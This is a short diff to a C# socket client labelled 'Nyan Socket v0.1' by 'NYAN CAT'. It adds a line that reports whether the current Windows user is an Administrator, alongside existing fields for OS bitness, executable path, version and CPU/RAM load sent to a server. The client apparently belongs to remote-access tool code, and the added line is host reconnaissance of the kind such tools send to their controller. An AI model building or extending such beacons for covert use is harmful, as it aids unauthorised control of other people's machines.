@@ -8,6 +8,7 @@ using System.IO;
 using System.Net.Sockets;
 using System.Threading;
 using System.Text;
+using System.Security.Principal;
 
 //       │ Author     : NYAN CAT
 //       │ Name       : Nyan Socket v0.1
@@ -80,6 +81,7 @@ namespace Client.Sockets
                 Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
             msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
             msgpack.ForcePathObject("Version").AsString = Settings.Version;
+            msgpack.ForcePathObject("Admin").AsString = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString().ToLower().Replace("true", "Administrator").Replace("false","User");
             TheCPUCounter.NextValue();
             msgpack.ForcePathObject("Performance").AsString = $"CPU {(int)TheCPUCounter.NextValue()}%   RAM {(int)TheMemCounter.NextValue()}%";
             return msgpack.Encode2Bytes();
